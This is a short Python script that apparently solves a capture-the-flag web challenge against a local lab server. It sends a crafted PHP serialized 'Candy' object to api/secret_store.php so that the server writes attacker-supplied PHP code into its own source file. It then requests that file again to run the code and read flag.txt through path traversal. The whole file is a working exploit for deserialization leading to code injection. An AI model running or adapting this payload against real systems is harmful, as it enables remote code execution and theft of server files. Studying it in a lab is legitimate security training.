import requests

# First, inspect robots.txt and find the api/ routes
# Notice the server response to the AJAX request to api/store.php
# The server appends the passed 'name' to the end of the file which path is is in the serialized Candy object

url = 'http://172.17.0.2'
#url = 'http://localhost:8000'

# passing file to requests.post makes the request a multipart/form-data request
dummy_dict = {'name': 'dummy'}

# Pass the secret api filepath and an evil instruction to the regular store
data = {
    "name": "echo file_get_contents('../flag.txt');", "filename": "../flag.txt"}
regular_store_response = requests.post(
    url + '/api/store.php', files=dummy_dict, data=data)
print(regular_store_response.request.body)
print(regular_store_response.status_code)
print(regular_store_response.text)
print('')

# Ok, it sends to the secret store after validating... Let's send to the secret store directly
data = {
    "object": "O:5:\"Candy\":2:{s:4:\"name\";s:38:\"echo file_get_contents('../flag.txt');\";s:8:\"filename\";s:18:\"./secret_store.php\";}"}
secret_store_response = requests.post(
    url + '/api/secret_store.php', data=data, files=dummy_dict)
print(secret_store_response.status_code)
print(secret_store_response.text)
print('')

# So now the server code has been changed! Let's send the request again to the secret store
data = {
    "object": "O:5:\"Candy\":2:{s:4:\"name\";s:38:\"echo file_get_contents('../flag.txt');\";s:8:\"filename\";s:18:\"./secret_store.php\";}"}
secret_store_response = requests.post(
    url + '/api/secret_store.php', data=data, files=dummy_dict)
print(secret_store_response.status_code)
print(secret_store_response.text)
print('')
